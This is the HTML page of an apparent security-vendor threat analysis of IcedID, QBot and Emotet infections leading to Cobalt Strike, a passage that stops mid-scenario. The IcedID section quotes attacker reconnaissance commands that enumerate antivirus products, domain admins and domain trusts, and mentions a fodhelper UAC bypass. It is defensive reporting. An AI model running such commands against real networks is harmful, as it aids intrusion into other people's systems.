<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Cybereason Global SOC Team">
    <meta name="description" content="The Cybereason GSOC delivers details on three recently observed attack scenarios where fast-moving malicious actors used the malware loaders IcedID, QBot and Emotet to deploy the Cobalt Strike framework on the compromised systems...">
    <meta name="generator" content="HubSpot">
    <title>THREAT ANALYSIS: Cobalt Strike - IcedID, Emotet and QBot</title>
    <link rel="shortcut icon" href="https://www.cybereason.com/hubfs/cr-favicon-1.png">
    

    
    <meta property="og:description" content="The Cybereason GSOC delivers details on three recently observed attack scenarios where fast-moving malicious actors used the malware loaders IcedID, QBot and Emotet to deploy the Cobalt Strike framework on the compromised systems...">
    <meta property="og:title" content="THREAT ANALYSIS: Cobalt Strike - IcedID, Emotet and QBot">
    <meta name="twitter:description" content="The Cybereason GSOC delivers details on three recently observed attack scenarios where fast-moving malicious actors used the malware loaders IcedID, QBot and Emotet to deploy the Cobalt Strike framework on the compromised systems...">
    <meta name="twitter:title" content="THREAT ANALYSIS: Cobalt Strike - IcedID, Emotet and QBot">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41681847227/1644941386203/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41682410610/1644941443237/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/43300360745/1649424828375/module_43300360745_CR_-_Malicious_Life_Network_--_Related_Posts.min.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/1669911113479/module_86933076631_CR_-_Sticky_CTA_Bar.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/34473990280/1681829697586/module_34473990280_CR_-_Footer_Full__en_US.min.css">
    

    
<!--  Added by GoogleAnalytics integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create','UA-56367941-1','auto');
  ga('send','pageview');
}}]);
</script>

<!-- /Added by GoogleAnalytics integration -->

<!--  Added by GoogleAnalytics4 integration -->
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

if (!window._hsGoogleConsentRunOnce) {
  window._hsGoogleConsentRunOnce = true;

  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'analytics_storage': 'denied'
  });

  var _hsp = window._hsp = window._hsp || [];

  _hsp.push(['addPrivacyConsentListener', function(consent){
    var hasAnalyticsConsent = consent && (consent.allowed || (consent.categories && consent.categories.analytics));
    var hasAdsConsent = consent && (consent.allowed || (consent.categories && consent.categories.advertisement));

    gtag('consent', 'update', {
      'ad_storage': hasAdsConsent ? 'granted' : 'denied',
      'analytics_storage': hasAnalyticsConsent ? 'granted' : 'denied'
    });
  }]);
}

gtag('js', new Date());
gtag('set', 'developer_id.dZTQ1Zm', true);
gtag('config', 'G-PZ3FE06790');
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PZ3FE06790"></script>
<!-- /Added by GoogleAnalytics4 integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];

var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-TJVVB7C');

    window._hsGtmLoadOnce = true;
};

var useGoogleConsentMode = false;

if (!useGoogleConsentMode){
    _hsp.push(['addPrivacyConsentListener', function(consent){
      if(consent.allowed || (consent.categories && consent.categories.analytics)){
        hsLoadGtm();
      }
  }]);
} else{
    if(!window._hsGoogleConsentRunOnce){
      window._hsGoogleConsentRunOnce=true;

      window.dataLayer=window.dataLayer||[];
      function gtag(){dataLayer.push(arguments);}

      gtag('consent','default',{
        'ad_storage':'denied',
        'analytics_storage':'denied'
      });

      gtag('set','developer_id.dZTQ1Zm',true);

      _hsp.push(['addPrivacyConsentListener',function(consent){
      var hasAnalyticsConsent=consent&&(consent.allowed||(consent.categories&&consent.categories.analytics));
      var hasAdsConsent=consent&&(consent.allowed||(consent.categories&&consent.categories.advertisement));

      gtag('consent','update',{
        'ad_storage':hasAdsConsent?'granted':'denied',
        'analytics_storage':hasAnalyticsConsent?'granted':'denied'
      });
    }]);
  }

  hsLoadGtm();
}
</script>

<!-- /Added by GoogleTagManager integration -->


<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://use.typekit.net/vyv2ljd.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="preload" href="/hubfs/__dam/fonts/ionicons.eot" as="font" type="font/otf" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Regular.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Medium.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/peristyle/Peristyle-Black.woff2" as="font" type="font/woff2" crossorigin>
<link rel="amphtml" href="https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot?hs_amp=true">

<meta property="og:image" content="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29%20%281%29.png#keepProtocol">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">
<meta property="og:image:alt" content="emotet malware">
<meta name="twitter:image" content="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29%20%281%29.png#keepProtocol">
<meta name="twitter:image:alt" content="emotet malware">

<meta property="og:url" content="https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot">
<meta name="twitter:card" content="summary_large_image">

<link rel="canonical" href="https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cybereason.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cybereason.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/7052064/hub_generated/template_assets/1703783682053/hubspot/hubspot_default/shared/responsive/layout.min.css">


<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/34470223313/1696396395659/__CR_Web_Platform/CSS/cr-master__cta.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/34470477360/1691993938188/__CR_Web_Platform/CSS/cr-master__main.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/35275979682/1642096258129/__CR_Web_Platform/CSS/ionicons.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42760289143/1663004429410/__CR_Web_Platform/CSS/cr-mln__build.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/34470224480/1635957556830/__CR_Web_Platform/CSS/bulma/cr-framework__bulma-columns.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/35291999472/1696396871390/__CR_Web_Platform/CSS/bulma/cr-framework__bulma.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42363645447/1635957556555/__CR_Web_Platform/CSS/hamburger-animation.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42507091846/1635957557027/__CR_Web_Platform/CSS/animate.min.css">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
<script src="/hubfs/dam/plugins/marker-animation.js"></script>
<script>
$(document).ready(function() {
  $('.highlight').markerAnimation({
    "color":'var(--cr-yellow)',
    "font_weight":'normal',
    "background-size": '200% 1.2em'
  });
});
</script>

    <style>
.cr-mln__blog-post .container-is-blog.cr-mln__blog-post--body .column:nth-of-type(2) img {
    background: #FFFFFF;
    border: 1px solid #CCCCCC;
    border-radius: 5px 5px 5px 5px;
    padding: 10px;
} 
</style>

</head>
<body class="   hs-content-id-65794753062 hs-blog-post hs-blog-id-5272851739" style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJVVB7C" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433790649568" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section id="cr-malicious-life-network__tier-one-header" class="position-flex">
  <div class="#">
    <div id="logo"><a href="https://www.cybereason.com"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-black.png"></a></div>
    <div id="back-to">
      <a href="https://www.cybereason.com">Back to <span>Cybereason.com</span></a>
    </div>
    <!-- Hamburger Menu -->
    <button class="hamburger hamburger--collapse" type="button">
      <span class="hamburger-box">
        <span class="hamburger-inner"></span>
      </span>
    </button>
    <div class="cr-mln__hamburger-menu--overlay">
      <ul>
        <li><a href="https://www.cybereason.com/blog/all"><span class="underline">All Posts</span></a></li>
        <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
        <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
        <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
        <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
        <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
        <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
      </ul>
      <div class="subscribe">
        <a href="#blog-subscribe">Subscribe</a>
      </div>
    </div>
    <!-- -->
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget mln-homepage" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433785464566" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__hero-main base">
  <div class="container-is-blog columns hero-content page-center">
    <div class="column is-5-fullhd is-5-desktop is-12-touch">
      <a href="/blog"><img class="cr-mln-logo" src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-malicious-life-logo-v2.png"></a>
    </div>
    <div class="column is-7-fullhd is-7-desktop is-hidden-mobile is-hidden-tablet-only">
      <div class="cr-mln__search-subscribe">
        <div class="cr-mln__search">
          <a href="#cr-search-modal" class="search-btn"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-blog-icon--search-dark-gray.png" alt="Search"></a>
        </div>
        <div class="cr-mln__subscribe">
          <a class="btn-subscribe" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>
      <div class="cr-mln__category-nav">
        <ul>
          <li><a href="/blog/category/all"><span class="underline">All</span></a></li>
          <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
          <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
          <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
          <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
          <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
          <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
        </ul>
      </div>
    </div>
  </div>
      <!-- MOBILE Search and Subscribe -->
      <div class="container-is-blog columns is-gapless is-hidden-desktop cr-mln__search-subscribe--mobile">
        <div class="column">
          <a class="search-btn">Search</a>
        </div>
        <div class="column">
          <a class="#" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>

      <!-- END MOBILE Search and Subscribe -->
  
  <!-- SEARCH Modal Wrap -->

  <div id="cr-search-modal">
        <!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID -->
        <div id="btn-close-modal" class="close-cr-search-modal"> 
            X
        </div>

        <div class="modal-content">
            <div class="container columns">
              <div class="column">
                <div class="cr-search-modal__search-bar">
                  <h3>Search</h3>
                  <form action="/hs-search-results">
                    <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search...">
                    <input type="hidden" name="type" value="BLOG_POST">
                    <input type="hidden" name="type" value="LISTING_PAGE">
                    <button type="submit" class="arrow"></button>
                  </form>
                  
                </div>

              </div>
          </div>
        </div>
    </div>
  <!-- END Search Modal Wrap -->

</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">







<div class="cr-mln__blog-post">
  <div class="container-is-blog columns is-multiline page-center">

    <div class="column is-8-fullhd is-8-desktop is-offset-2-fullhd is-offset-2-desktop is-10-tablet is-offset-1-tablet">
      <div class="featured-image"><img src="https://www.cybereason.com/hubfs/Threat%20Alert%20template%20%284%29%20%281%29.png" alt=""></div>
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">THREAT ANALYSIS: Cobalt Strike - IcedID, Emotet and QBot</span></h1>
      <div class="cr-mln__post-author-share">
      <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
        
          <span class="descriptor">Written By</span>
          <p><span class="author">Cybereason Global SOC Team</span></p>
         
      </div>
    </div>
     
    </div>
    
    <!-- Sticky Author and Social Box -->
    
    <!-- END Sticky Author and Social Box -->
      <div class="container-is-blog columns is-multiline page-center cr-mln__blog-post--body">
        
        <div class="column is-7-fullhd is-7-desktop is-10-tablet is-10-mobile is-offset-1-fullhd is-offset-1-desktop is-offset-1-tablet is-offset-1-mobile">
          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The Cybereason <a href="/blog/authors/cybereason-global-soc-team" rel="noopener" target="_blank"><span>Global Security Operations Center Team</span></a> (GSOC) issues Cybereason Threat Analysis reports to inform on impacting threats. The Threat Analysis reports investigate these threats and provide practical recommendations for protecting against them.&nbsp;</p>
<!--more-->
<p>In this Threat Analysis report, the GSOC provides details about three recent attack scenarios where fast-moving malicious actors used the malware loaders <a href="/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware" rel="noopener" target="_blank"><span>IcedID</span></a>, <a href="/blog/threat-analysis-report-datoploader-exploits-proxyshell-to-deliver-qbot-and-cobalt-strike" rel="noopener" target="_blank"><span>QBot</span></a>, and <a href="/blog/threat-alert-the-return-of-emotet" rel="noopener" target="_blank"><span>Emotet</span></a> to deploy the <a href="/blog/threat-analysis-report-datoploader-exploits-proxyshell-to-deliver-qbot-and-cobalt-strike" rel="noopener" target="_blank"><span>Cobalt Strike</span></a> framework on the compromised systems.</p>
<p>The deployment of Cobalt Strike as part of an attack significantly increases the severity of the attack due to the framework’s high damage potential. One of the attack scenarios that we discuss in this article involves affiliates of the <a href="/blog/cybereason-vs.-conti-ransomware" rel="noopener" target="_blank"><span>Conti ransomware</span></a> group.</p>
<h2 style="font-weight: normal;">cobalt strike Key Points</h2>
<ul>
<li aria-level="1"><strong>Fast-moving adversaries</strong>: The threat actors conducted malicious activities in the compromised systems after only approximately 8 minutes after infecting the systems with the malware loader IcedID, QBot, or Emotet. The malicious actors deployed Cobalt Strike up to approximately 2 hours after accessing the compromised systems.</li>
<li aria-level="1"><strong>Targeted phishing emails</strong>: Malicious actors, who we attribute as affiliates of the <a href="/blog/cybereason-vs.-conti-ransomware" rel="noopener" target="_blank"><span>Conti</span></a> ransomware group, specifically targeted a user by sending the user an email with an attachment (an Excel document) that was almost identical to a legitimate email and email attachment already distributed to other users within the organization. The difference was that the attached Excel document contained a malicious macro that distributed IcedID.</li>
<li aria-level="1"><strong>Detected and prevented</strong>: The <a href="/platform" rel="noopener" target="_blank"><span>Cybereason XDR Platform</span></a> effectively detects and prevents the IcedID, QBot, and Emotet malware.&nbsp;</li>
<li aria-level="1"><strong>Cybereason Managed Detection and Response (MDR)</strong>: The Cybereason GSOC has zero tolerance towards attacks that involve malware loaders, such as IcedID, QBot, and Emotet, and categorizes such attacks as critical, high-severity incidents. The <a href="/services/managed-detection-response-mdr" rel="noopener" target="_blank"><span>Cybereason GSOC MDR Team</span></a> issues a comprehensive report to customers when such an incident occurs. The report provides an in-depth overview of the incident, which helps scope the extent of compromise and the impact on the customer’s environment. In addition, the report provides attribution information when possible as well as recommendations for mitigating and isolating the threat.</li>
</ul>
<h2 style="font-weight: normal;">Introduction to cobalt strike</h2>
<p><a href="https://www.cobaltstrike.com/" rel="noopener" target="_blank"><span>Cobalt Strike</span></a> is an adversary simulation framework with the primary use case of assisting red team operations. However, Cobalt Strike is also actively used by malicious actors for conducting post-intrusion malicious activities. Cobalt Strike is a <a href="https://www.mandiant.com/resources/defining-cobalt-strike-components#:~:text=Cobalt%20Strike%20is%20a%20commercial,Advanced%20Persistent%20Threats%20(APTs)." rel="noopener" target="_blank"><span>modular framework</span></a> with an extensive set of features that are useful to malicious actors, such as command execution, process injection, and credential theft.</p>
<p>The deployment of Cobalt Strike as part of an attack significantly increases the severity of the attack: for example, once Cobalt Strike runs on a compromised system, the Cobalt Strike operators can broker the system as an initial access point to other threat actors, including ransomware group affiliates.</p>
<p>In the period between October 2021 and the time of writing this article, the Cybereason GSOC has observed multiple attack scenarios where malicious actors used malware that is capable of deploying additional malware on compromised systems (i.e. malware loaders) to deploy Cobalt Strike on the systems.</p>
<p>In this article, we present the activities of the malware loaders and the malicious actors that operated the loaders in three selected attack scenarios. Each scenario involves one of the malware loaders IcedID, QBot, and Emotet, and results in the deployment of Cobalt Strike. One of the attack scenarios that we discuss in this article involves affiliates of the Conti ransomware group.</p>
<p>Malicious actors use the IcedID malware to distribute various types of malware, including <a href="/fundamentals/what-is-ransomware" rel="noopener" target="_blank"><span>ransomware</span></a>, to compromised systems. Malicious actors typically infect systems with IcedID through attachments, usually Microsoft Office documents, in phishing emails. Once deployed on a system, IcedID uses legitimate system utilities to conduct malicious activities, such as reconnaissance activities and disabling security mechanisms. Malicious actors also use the IcedID malware to deploy Cobalt Strike on compromised systems.&nbsp;</p>
<p>QBot, also known as Qakbot, is a malware that has been present on the threat landscape since 2007. QBot originally featured information stealing and trojan functionalities, however, the malicious actors that develop QBot have extended the malware with malware loading capabilities. In recent attack campaigns, malicious actors distribute QBot through malicious attachments in phishing emails. QBot downloads and executes additional malware on compromised machines, such as the Cobalt Strike framework, and ransomware, such as <a href="/blog/cybereason-vs.-revil-ransomware" rel="noopener" target="_blank"><span>REvil</span></a> and <a href="/blog/three-reasons-why-you-should-never-pay-ransomware-attackers" rel="noopener" target="_blank"><span>ProLock</span></a>.&nbsp;</p>
<p>Since security researchers first discovered the Emotet malware in 2014, the malware has evolved from a traditional banking Trojan to a malware loader. Over the last few years, before authorities <a href="https://www.europol.europa.eu/media-press/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action" rel="noopener" target="_blank"><span>disrupted</span></a> the infrastructure of Emotet operators as part of a global operation in the first quarter of 2021, malicious actors have been using Emotet to deliver the Ryuk ransomware to compromised systems.</p>
<p>On November 15, 2021, security researchers announced the discovery of a <a href="https://twitter.com/gdata_adan/status/1460298879090503681" rel="noopener" target="_blank"><span>new variant of Emotet</span></a> on the threat landscape. The Cybereason GSOC team observed attack <a href="/blog/threat-alert-the-return-of-emotet" rel="noopener" target="_blank"><span>scenarios that involved the new Emotet malware</span></a> shortly thereafter, which involved Emotet deploying Cobalt Strike on compromised systems.</p>
<h2 style="font-weight: normal;">Analysis of COBALT STRIKE</h2>
<h3 style="font-weight: normal;">From IcedID to Cobalt Strike: Conti Ransomware Affiliates</h3>
<p>The figure below depicts an infection using the IcedID malware that results in the deployment of Cobalt Strike. In this scenario, the malicious actors, who we attribute as affiliates of the <a href="/blog/cybereason-vs.-conti-ransomware" rel="noopener" target="_blank"><span>Conti ransomware</span></a> group, specifically targeted a user by sending the user an email with an attachment (an Excel document) that is almost identical to a legitimate email and email attachment already distributed to other users within the organization.</p>
<p>The difference was that the attached Excel document contained a malicious macro. This indicates a potential long-term presence of the actors in the environment:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=1721&amp;name=image12-1.jpg" alt="image12-1" width="1721" loading="lazy" style="width: 1721px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=861&amp;name=image12-1.jpg 861w, https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=1721&amp;name=image12-1.jpg 1721w, https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=2582&amp;name=image12-1.jpg 2582w, https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=3442&amp;name=image12-1.jpg 3442w, https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=4303&amp;name=image12-1.jpg 4303w, https://www.cybereason.com/hs-fs/hubfs/image12-1.jpg?width=5163&amp;name=image12-1.jpg 5163w" sizes="(max-width: 1721px) 100vw, 1721px"></em><span style="font-size: 16px;"><em>infection using the IcedID malware</em></span></p>
<p>When the targeted user executed the macro, the macro downloaded the executable file of the IcedID malware from an attacker-controlled endpoint and then executed the file. The macro downloaded the IcedID executable to the home directory of the user, such as <em>C:\Users\test\javabridge64.exe</em>, where <em>javabridge64.exe</em> is the name of the IcedID executable and <em>C:\Users\test</em> is the home directory of the user <em>test</em>:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=806&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png" alt="image20-Feb-08-2022-10-31-41-74-PM" width="806" loading="lazy" style="width: 806px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=403&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png 403w, https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=806&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png 806w, https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=1209&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png 1209w, https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=1612&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png 1612w, https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=2015&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png 2015w, https://www.cybereason.com/hs-fs/hubfs/image20-Feb-08-2022-10-31-41-74-PM.png?width=2418&amp;name=image20-Feb-08-2022-10-31-41-74-PM.png 2418w" sizes="(max-width: 806px) 100vw, 806px"></em><span style="font-size: 16px;"><em>Malicious Office macro executes IcedID javabridge64.exe as seen in the Cybereason XDR Platform</em></span></p>
<p>Approximately 8 minutes after the malicious Office macro executed IcedID, the malicious actors executed the <a href="https://www.binarydefense.com/icedid-gziploader-analysis/" rel="noopener" target="_blank"><em><span>SysInfo</span></em></a> IcedID command to enumerate relevant system information, such as active processes, and to conduct the following reconnaissance activities:</p>
<ul>
<li aria-level="1">IcedID executed the following command to retrieve a list of the security solutions that are installed on the compromised system:
<ul>
<li aria-level="1"><em>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List</em></li>
</ul>
</li>
</ul>
<ul>
<li aria-level="1">IcedID executed the command<em> ipconfig /all </em>to retrieve the networking configuration of the compromised system.</li>
<li aria-level="1">IcedID executed the <em>systeminfo.exe</em> Windows utility to retrieve detailed information about the compromised system, such as operating system version and hardware configuration.</li>
<li aria-level="1">IcedID executed the following commands to retrieve Active Directory (AD)-related information:</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="3"><em>net view /all</em></li>
</ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="3"><em>net view /all /domain</em></li>
</ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="3"><em>net config workstation</em></li>
</ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="3"><em>net group "Domain Admins" /domain</em></li>
</ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="3"><em>nltest /domain_trusts</em></li>
</ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul>
<li aria-level="3"><em>nltest /domain_trusts /all_trusts</em></li>
</ul>
</li>
</ul>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=478&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png" alt="image25-Feb-08-2022-10-32-50-97-PM" width="478" loading="lazy" style="width: 478px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=239&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png 239w, https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=478&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png 478w, https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=717&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png 717w, https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=956&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png 956w, https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=1195&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png 1195w, https://www.cybereason.com/hs-fs/hubfs/image25-Feb-08-2022-10-32-50-97-PM.png?width=1434&amp;name=image25-Feb-08-2022-10-32-50-97-PM.png 1434w" sizes="(max-width: 478px) 100vw, 478px"></em><span style="font-size: 16px;"><em>IcedID reconnaissance activities as seen in the Cybereason XDR Platform</em></span></p>
<p>Approximately 20 minutes after conducting reconnaissance activities, the malicious actors executed the <a href="https://www.binarydefense.com/icedid-gziploader-analysis/" rel="noopener" target="_blank"><em><span>ExecAdmin</span></em></a> IcedID command that attempts to elevate user privileges using a known Windows User Account Control (UAC) bypass that leverages the <em>fodhelper</em> Windows utility.&nbsp;</p>
